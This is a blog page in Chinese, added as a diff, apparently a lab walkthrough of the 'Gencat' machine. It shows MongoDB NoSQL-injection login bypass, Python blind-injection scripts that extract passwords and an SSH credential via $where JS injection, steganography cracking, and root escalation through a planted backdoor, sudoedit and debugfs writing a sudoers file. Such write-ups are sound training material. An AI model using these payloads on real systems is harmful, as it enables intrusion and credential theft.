@@ -1,0 +1,420 @@
+<!DOCTYPE html>
+<html data-color-mode="light" data-dark-theme="github-light" data-light-theme="light" lang="zh-CN">
+<head>
+    <meta content="text/html; charset=utf-8" http-equiv="content-type" />
+    <meta name="viewport" content="width=device-width,initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <link href='https://7r1UMPHK.github.io/css/primer.css' rel='stylesheet' />
+    <script src='https://7r1UMPHK.github.io/plugins/theme.js'></script><script data-goatcounter='https://7r1umphk.goatcounter.com/count' async src='https://7r1UMPHK.github.io/plugins/count.js'></script>
+    <link rel="icon" href="https://7r1UMPHK.github.io/image/20250320200557660.ico">
+<meta name="description" content="# 信息收集
+
+```bash
+IP=192.168.205.172
+nmap -p- --min-rate 10000 $IP
+nmap -sV -sC -p22,80,5000,27017 $IP
+```
+
+四个端口全开：
+
+```
+PORT      STATE SERVICE VERSION
+22/tcp    open  ssh     OpenSSH 10.0
+80/tcp    open  http    lighttpd 1.4.82
+5000/tcp  open  http    Werkzeug 3.1.5 (Python 3.12.12)
+27017/tcp open  mongodb MongoDB 4.4.6
+```
+
+27017 是 MongoDB，尝试直接 mongo 连上去枚举，没有认证凭据，`show dbs`、`show collections` 全部 Unauthorized。">
+<meta property="og:title" content="内部_Gencat">
+<meta property="og:description" content="# 信息收集
+
+```bash
+IP=192.168.205.172
+nmap -p- --min-rate 10000 $IP
+nmap -sV -sC -p22,80,5000,27017 $IP
+```
+
+四个端口全开：
+
+```
+PORT      STATE SERVICE VERSION
+22/tcp    open  ssh     OpenSSH 10.0
+80/tcp    open  http    lighttpd 1.4.82
+5000/tcp  open  http    Werkzeug 3.1.5 (Python 3.12.12)
+27017/tcp open  mongodb MongoDB 4.4.6
+```
+
+27017 是 MongoDB，尝试直接 mongo 连上去枚举，没有认证凭据，`show dbs`、`show collections` 全部 Unauthorized。">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://7r1UMPHK.github.io/post/nei-bu-_Gencat.html">
+<meta property="og:image" content="https://7r1UMPHK.github.io/image/20251025224622174.webp">
+<title>内部_Gencat</title>
+
+
+
+</head>
+<style>
+body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;padding: 45px;font-size: 16px;font-family: sans-serif;line-height: 1.25;}
+#header{display:flex;padding-bottom:8px;border-bottom: 1px solid var(--borderColor-muted, var(--color-border-muted));margin-bottom: 16px;}
+#footer {margin-top:64px; text-align: center;font-size: small;}
+
+</style>
+
+<style>
+.postTitle{margin: auto 0;font-size:40px;font-weight:bold;}
+.title-right{display:flex;margin:auto 0 0 auto;}
+.title-right .circle{padding: 14px 16px;margin-right:8px;}
+#postBody{border-bottom: 1px solid var(--color-border-default);padding-bottom:36px;}
+#postBody hr{height:2px;}
+#cmButton{height:48px;margin-top:48px;}
+#comments{margin-top:64px;}
+.g-emoji{font-size:24px;}
+@media (max-width: 600px) {
+    body {padding: 8px;}
+    .postTitle{font-size:24px;}
+}
+
+</style>
+
+
+
+
+<body>
+    <div id="header">
+<h1 class="postTitle">内部_Gencat</h1>
+<div class="title-right">
+    <a href="https://7r1UMPHK.github.io" id="buttonHome" class="btn btn-invisible circle" title="首页">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathHome" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+    
+    <a href="https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/302" target="_blank" class="btn btn-invisible circle" title="Issue">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathIssue" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+    
+
+    <a class="btn btn-invisible circle" onclick="modeSwitch();" title="切换主题"style="display:none;">
+        <svg class="octicon" width="16" height="16" >
+            <path id="themeSwitch" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+
+</div>
+</div>
+    <div id="content">
+<div class="markdown-body" id="postBody"><h1>信息收集</h1>
+<pre lang="bash"><code>IP=192.168.205.172
+nmap -p- --min-rate 10000 $IP
+nmap -sV -sC -p22,80,5000,27017 $IP
+</code></pre>
+<p>四个端口全开：</p>
+<pre><code>PORT      STATE SERVICE VERSION
+22/tcp    open  ssh     OpenSSH 10.0
+80/tcp    open  http    lighttpd 1.4.82
+5000/tcp  open  http    Werkzeug 3.1.5 (Python 3.12.12)
+27017/tcp open  mongodb MongoDB 4.4.6
+</code></pre>
+<p>27017 是 MongoDB，尝试直接 mongo 连上去枚举，没有认证凭据，<code>show dbs</code>、<code>show collections</code> 全部 Unauthorized。</p>
+<p>80 端口是 lighttpd 托管的静态页面，标题 &quot;NexGen Systems | Developer Portal&quot;，是一份 API 文档，给出了三个端点的调用格式。5000 端口就是实际的 Flask 服务。</p>
+<p>文档里的暗示相当直白：</p>
+<ul>
+<li><code>POST /api/v1/auth/login</code> 的 password 字段类型标注为 <code>string | object</code>，明示 NoSQL 注入</li>
+<li><code>POST /api/v2/resource/metadata</code> 描述里写 &quot;pattern-matching filtering&quot;，支持操作符查询</li>
+<li><code>GET /api/v3/system/diagnostic?probe_id={id}</code> 写着 &quot;JS-engine evaluation&quot;，还提到会注入 <code>env_flag</code> 做遥测审计</li>
+</ul>
+<p>页面底部三行注释更直接：<code>document-oriented storage</code>、<code>operator-based overrides</code>、<code>JS-engine evaluation</code>，等于把攻击面全摆台面上了。</p>
+<h1>NoSQL 注入与密码提取</h1>
+<h2>登录绕过</h2>
+<p>password 支持 object 类型，直接用 <code>$ne</code> 绕：</p>
+<pre lang="bash"><code>curl -s http://$IP:5000/api/v1/auth/login -H &quot;Content-Type: application/json&quot; -d '{&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:{&quot;$ne&quot;:null}}'
+</code></pre>
+<pre lang="json"><code>{&quot;role&quot;:&quot;viewer&quot;,&quot;status&quot;:&quot;authenticated&quot;,&quot;token&quot;:&quot;eyJ...&quot;}
+</code></pre>
+<p>登录成功但 role 是 viewer，不是 admin。这里卡了挺久，后来拿到源码才知道，代码里专门判断了如果 username 是 admin 且 password 是 dict 类型，会强制降级为 viewer。想拿 admin 权限的 token 必须用真实密码登录。</p>
+<p>而且后面两个接口的鉴权头是 <code>Authorization: &lt;JWT&gt;</code> 而不是 <code>Authorization: Bearer &lt;JWT&gt;</code>，一开始加了 Bearer 前缀一直 403，在这上面也浪费了不少时间。</p>
+<h2>盲注提取密码</h2>
+<p>login 端点配合 <code>$regex</code> 可以做布尔盲注。认证成功返回 <code>authenticated</code>，失败返回 <code>failed</code>，区分度很好。</p>
+<p>保存为 <code>blind.py</code> 执行：</p>
+<pre lang="python"><code>import requests, string
+
+url = &quot;http://192.168.205.172:5000/api/v1/auth/login&quot;
+headers = {&quot;Content-Type&quot;: &quot;application/json&quot;}
+chars = string.ascii_letters + string.digits + &quot;!@#$%^&amp;*()_+-=.,&quot;
+
+def esc(s):
+    out = &quot;&quot;
+    for c in s:
+        if c in r'\.+*?^${}()|[]':
+            out += '\\' + c
+        else:
+            out += c
+    return out
+
+for user in [&quot;admin&quot;, &quot;guest&quot;, &quot;operator&quot;]:
+    pwd = &quot;&quot;
+    for i in range(50):
+        found = False
+        for c in chars:
+            payload = {&quot;username&quot;: user, &quot;password&quot;: {&quot;$regex&quot;: &quot;^&quot; + esc(pwd + c)}}
+            r = requests.post(url, json=payload, headers=headers, timeout=5)
+            if &quot;token&quot; in r.text:
+                pwd += c
+                found = True
+                break
+        if not found:
+            break
+    print(f&quot;{user}: {pwd}&quot;)
+</code></pre>
+<pre lang="bash"><code>python3 blind.py
+</code></pre>
+<p>三组凭据提取出来：</p>
+<ul>
+<li>admin: <code>P@ss_Str0ng_9821</code></li>
+<li>guest: <code>guest_pw_123</code></li>
+<li>operator: <code>op_secure_992</code></li>
+</ul>
+<p>用 admin 明文密码重新登录，拿到 admin role 的 token：</p>
+<pre lang="bash"><code>TOKEN=$(curl -s http://$IP:5000/api/v1/auth/login -H &quot;Content-Type: application/json&quot; -d '{&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;P@ss_Str0ng_9821&quot;}' | python3 -c &quot;import sys,json;print(json.load(sys.stdin)['token'])&quot;)
+</code></pre>
+<h2>v2 端点枚举用户</h2>
+<p>v2 不是主线必要步骤，仅用于验证用户表内容。拿到 admin token 后用 metadata 端点做了下枚举，确认系统中存在 3 个用户：guest(uid=101)、operator(uid=102)、admin(uid=999)。密码和前面盲注结果一致，没发现其他有用字段。</p>
+<h1>JS 注入提取 SSH 凭据</h1>
+<p>diagnostic 端点的 <code>probe_id</code> 参数存在 <code>$where</code> 注入。文档提到会把 <code>env_flag</code> 注入到 JS 执行上下文中，思路就是通过注入把这个变量的值读出来。</p>
+<p>用 <code>env_flag.startsWith()</code> 做布尔盲注，逐字符提取。保存为 <code>flag.py</code> 执行：</p>
+<pre lang="python"><code>import requests, string
+
+BASE = &quot;http://192.168.205.172:5000&quot;
+TOKEN = &quot;&lt;admin_token&gt;&quot;
+CHARSET = string.ascii_letters + string.digits + &quot;_{}-!@#$%^&amp;*().,:&quot;
+
+def is_true(expr):
+    payload = f&quot;0' || ({expr}) || '1'=='2&quot;
+    r = requests.get(f&quot;{BASE}/api/v3/system/diagnostic&quot;, params={&quot;probe_id&quot;: payload}, headers={&quot;Authorization&quot;: TOKEN}, timeout=8)
+    return '&quot;status&quot;:&quot;Online&quot;' in r.text
+
+flag = &quot;&quot;
+for _ in range(80):
+    hit = False
+    for ch in CHARSET:
+        trial = flag + ch
+        trial_esc = trial.replace(&quot;\\&quot;, &quot;\\\\&quot;).replace(&quot;'&quot;, &quot;\\'&quot;)
+        if is_true(f&quot;env_flag.startsWith('{trial_esc}')&quot;):
+            flag += ch
+            hit = True
+            print(&quot;[+]&quot;, flag)
+            break
+    if not hit:
+        break
+print(&quot;FINAL:&quot;, flag)
+</code></pre>
+<pre lang="bash"><code>python3 flag.py
+</code></pre>
+<p>逐字符跑出来：<code>FLAG{cat:c4tc4tc4t}</code></p>
+<p>也可以用更暴力的方式，通过 <code>this.constructor.constructor</code> 在 Function 构造器里执行代码，配合 <code>throw</code> 把结果通过错误信息外带：</p>
+<pre lang="bash"><code>curl -s --get &quot;http://$IP:5000/api/v3/system/diagnostic&quot; --data-urlencode &quot;probe_id=1' || this.constructor.constructor('throw arguments.callee.caller.toString()')() || '1'=='&quot; -H &quot;Authorization: $TOKEN&quot;
+</code></pre>
+<p>错误信息里直接返回了完整的 $where 函数源码：</p>
+<pre><code>function() { var env_flag='FLAG{cat:c4tc4tc4t}'; return this.uid == '1' || ... }
+</code></pre>
+<p><code>FLAG{cat:c4tc4tc4t}</code> 的格式是 <code>用户名:密码</code>，这就是 SSH 的登录凭据。</p>
+<h1>获取初始 Shell</h1>
+<pre lang="bash"><code>ssh cat@$IP
+</code></pre>
+<p>密码 <code>c4tc4tc4t</code>，成功登录。</p>
+<p>上来后执行 <code>cat user.txt</code> 看到一堆莫名其妙的编译日志在刷屏，非常诡异。研究了一下发现 <code>/usr/bin/cat</code> 被替换了：</p>
+<pre lang="bash"><code>which cat
+head -n 5 /usr/bin/cat
+</code></pre>
+<p><code>/usr/bin/cat</code> 实际是一个脚本，内容指向 <code>/bin/gencat</code>（genact，一个假终端活动生成器）。需要用 busybox 的真 cat 或者其他读取方式绕过：</p>
+<pre lang="bash"><code>busybox cat /home/cat/user.txt
+# 或者
+tac /home/cat/user.txt
+</code></pre>
+<h1>横向移动到 dog</h1>
+<p>做文件时间线分析时注意到 <code>/var/www/localhost/static/shamao.jpg</code>，279KB，修改时间 2026-02-06，在一堆系统文件里很突兀。还有个 <code>/var/www/localhost/static/.trash</code> 内容是 <code>Maybe you should find a backdoor?</code>。</p>
+<p>把图片拉回 Kali 跑 stegseek：</p>
+<pre lang="bash"><code>stegseek shamao.jpg /usr/share/wordlists/rockyou.txt
+</code></pre>
+<pre><code>[i] Found passphrase: &quot;Serialace&quot;
+[i] Original filename: &quot;pass.txt&quot;
+[i] Extracting to &quot;shamao.jpg.out&quot;
+</code></pre>
+<pre lang="bash"><code>cat shamao.jpg.out
+</code></pre>
+<pre><code>eKCy4MrdnDAuQwcR
+</code></pre>
+<p>这个字符串是 base62 编码，解码后是 <code>d0ggd0ggd0gg</code>，这是 dog 用户的密码。</p>
+<pre lang="bash"><code>su - dog
+</code></pre>
+<p>输入 <code>d0ggd0ggd0gg</code>，成功切换。</p>
+<h1>提权到 root</h1>
+<h2>sudo 权限与后门分析</h2>
+<pre lang="bash"><code>sudo -l
+</code></pre>
+<pre><code>Defaults!/usr/sbin/visudo env_keep+=&quot;SUDO_EDITOR EDITOR VISUAL PATH&quot;
+(ALL) NOPASSWD: sudoedit /etc/motd
+</code></pre>
+<p>dog 可以用 sudoedit 以 root 身份编辑 <code>/etc/motd</code>，且 <code>SUDO_EDITOR</code> 环境变量会被保留。</p>
+<p>之前 linpeas 扫的时候就发现系统在运行一个叫 backdoor 的进程。查看 <code>/etc/local.d/backdoor.start</code>：</p>
+<pre lang="bash"><code>busybox cat /etc/local.d/backdoor.start
+</code></pre>
+<pre lang="sh"><code>#!/bin/sh
+TARGET_FILE=&quot;/etc/motd&quot;
+TARGET_HASH=&quot;5399e8634cc0be890edaf70a1c825c64&quot;
+EXPLOIT_TARGET=&quot;/etc/group&quot;
+{
+    while true; do
+        inotifywait -q -e close_write &quot;$TARGET_FILE&quot;
+        CURRENT_HASH=$(md5sum &quot;$TARGET_FILE&quot; | awk '{print $1}')
+        if [ &quot;$CURRENT_HASH&quot; = &quot;$TARGET_HASH&quot; ]; then
+            chmod o+w &quot;$EXPLOIT_TARGET&quot;
+        fi
+    done
+} &amp;
+</code></pre>
+<p>用 inotifywait 监控 <code>/etc/motd</code>，MD5 匹配 <code>5399e8634cc0be890edaf70a1c825c64</code> 时把 <code>/etc/group</code> 改成所有人可写。cmd5 查了一下这个哈希，对应的明文是 <code>0e123456</code>。</p>
+<pre lang="bash"><code>echo -n &quot;0e123456&quot; | md5sum
+</code></pre>
+<pre><code>5399e8634cc0be890edaf70a1c825c64
+</code></pre>
+<h2>触发后门</h2>
+<p>直接 <code>sudoedit /etc/motd</code> 用 vim 编辑的话，保存时会自动加一个换行符导致 MD5 不匹配。可以在 vim 里 <code>:set noeol binary</code> 再保存，或者用 <code>SUDO_EDITOR</code> 指定一个自定义脚本精确控制写入内容：</p>
+<pre lang="bash"><code>printf '#!/bin/sh\nprintf &quot;0e123456&quot; &gt; &quot;$1&quot;\n' &gt; /tmp/notrail.sh
+chmod +x /tmp/notrail.sh
+SUDO_EDITOR=&quot;/tmp/notrail.sh&quot; sudoedit /etc/motd
+</code></pre>
+<p>验证 MD5：</p>
+<pre lang="bash"><code>md5sum /etc/motd
+</code></pre>
+<pre><code>5399e8634cc0be890edaf70a1c825c64  /etc/motd
+</code></pre>
+<p>等 inotifywait 触发：</p>
+<pre lang="bash"><code>sleep 2
+ls -la /etc/group
+</code></pre>
+<pre><code>-rw-r--rw-    1 root     root           650 ...
+</code></pre>
+<p><code>/etc/group</code> 可写了。</p>
+<h2>debugfs 写 sudoers 提权</h2>
+<p><code>/etc/group</code> 可写意味着可以把自己加入 disk 组。disk 组的用户可以直接用 debugfs 读写块设备，等于拥有了对文件系统的完全控制权。</p>
+<p>编辑 <code>/etc/group</code>，将 dog 加入 disk 组（注意 <code>/etc/group</code> 第四字段的用户列表使用逗号分隔）：</p>
+<pre><code>disk:x:6:root,dog
+</code></pre>
+<p>重新登录 dog 让附加组生效：</p>
+<pre lang="bash"><code>exit
+su - dog
+id
+</code></pre>
+<p>确认输出中包含 <code>6(disk)</code>。</p>
+<p>确认根分区设备和文件系统类型：</p>
+<pre lang="bash"><code>mount | grep ' on / '
+</code></pre>
+<pre><code>/dev/sda3 on / type ext4 (rw,relatime)
+</code></pre>
+<p>用 debugfs 往 <code>/etc/sudoers.d/</code> 写入一条规则，给 dog 用户无密码 sudo 权限：</p>
+<pre lang="bash"><code>printf 'dog ALL=(ALL) NOPASSWD: ALL\n' &gt; /tmp/give_dog_sudo
+
+/usr/sbin/debugfs -w /dev/sda3 &lt;&lt;'EOF'
+write /tmp/give_dog_sudo /etc/sudoers.d/give_dog_sudo
+sif /etc/sudoers.d/give_dog_sudo i_mode 0100440
+sif /etc/sudoers.d/give_dog_sudo i_uid 0
+sif /etc/sudoers.d/give_dog_sudo i_gid 0
+q
+EOF
+</code></pre>
+<p>debugfs 直接操作 ext 文件系统的 inode，写入文件并设置权限为 0440（<code>0100440</code> 中 <code>0100000</code> 表示普通文件，<code>0440</code> 为权限位）、owner 为 root:root，满足 sudoers 的安全检查要求。</p>
+<pre lang="bash"><code>sudo -l
+sudo sh
+id
+</code></pre>
+<pre><code>uid=0(root) gid=0(root)
+</code></pre>
+<h1>Flag</h1>
+<pre lang="bash"><code>busybox cat /home/cat/user.txt
+busybox cat /root/root.txt
+</code></pre>
+<pre><code>flag{user-af6b54609f58d96c373f64179758201d}
+flag{root-99dc32aab0563305b639550763a02e32}
+</code></pre>
+</div>
+<div style="font-size:small;margin-top:8px;float:right;"></div>
+
+<button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
+<div class="comments" id="comments"></div>
+
+</div>
+    <div id="footer"><div id="footer1">Copyright © <span id="copyrightYear"></span> <a href="https://7r1UMPHK.github.io">TriumphK Blog</a></div>
+<div id="footer2">
+    <span id="runday"></span><span>Powered by <a href="https://meekdai.com/Gmeek.html" target="_blank">Gmeek</a></span>
+</div>
+
+<script>
+var now=new Date();
+document.getElementById("copyrightYear").innerHTML=now.getFullYear();
+
+if(""!=""){
+    var startSite=new Date("");
+    var diff=now.getTime()-startSite.getTime();
+    var diffDay=Math.floor(diff/(1000*60*60*24));
+    document.getElementById("runday").innerHTML="网站运行"+diffDay+"天"+" • ";
+}
+</script></div>
+</body>
+<script>
+var IconList={'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'sync': 'M1.705 8.005a.75.75 0 0 1 .834.656 5.5 5.5 0 0 0 9.592 2.97l-1.204-1.204a.25.25 0 0 1 .177-.427h3.646a.25.25 0 0 1 .25.25v3.646a.25.25 0 0 1-.427.177l-1.38-1.38A7.002 7.002 0 0 1 1.05 8.84a.75.75 0 0 1 .656-.834ZM8 2.5a5.487 5.487 0 0 0-4.131 1.869l1.204 1.204A.25.25 0 0 1 4.896 6H1.25A.25.25 0 0 1 1 5.75V2.104a.25.25 0 0 1 .427-.177l1.38 1.38A7.002 7.002 0 0 1 14.95 7.16a.75.75 0 0 1-1.49.178A5.5 5.5 0 0 0 8 2.5Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z'};
+var utterancesLoad=0;
+
+console.log("\n %c Gmeek main https://github.com/Meekdai/Gmeek \n","padding:5px 0;background:#02d81d;color:#fff");
+</script>
+
+<script>
+document.getElementById("pathHome").setAttribute("d",IconList["home"]);
+document.getElementById("pathIssue").setAttribute("d",IconList["github"]);
+
+
+
+function openComments(){
+    cm=document.getElementById("comments");
+    cmButton=document.getElementById("cmButton");
+    cmButton.disabled=true;
+    cmButton.innerHTML="loading";
+    span=document.createElement("span");
+    span.setAttribute("class","AnimatedEllipsis");
+    cmButton.appendChild(span);
+
+    script=document.createElement("script");
+    script.setAttribute("src","https://utteranc.es/client.js");
+    script.setAttribute("repo","7r1UMPHK/7r1UMPHK.github.io");
+    script.setAttribute("issue-term","title");
+    
+    script.setAttribute("theme","github-light");
+    
+    script.setAttribute("crossorigin","anonymous");
+    script.setAttribute("async","");
+    cm.appendChild(script);
+
+    int=self.setInterval("iFrameLoading()",200);
+}
+
+function iFrameLoading(){
+    var utterances=document.getElementsByClassName('utterances');
+    if(utterances.length==1){
+        if(utterances[0].style.height!=""){
+            utterancesLoad=1;
+            int=window.clearInterval(int);
+            document.getElementById("cmButton").style.display="none";
+            console.log("utterances Load OK");
+        }
+    }
+}
+
+
+
+</script>
+</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>
+
+</html>
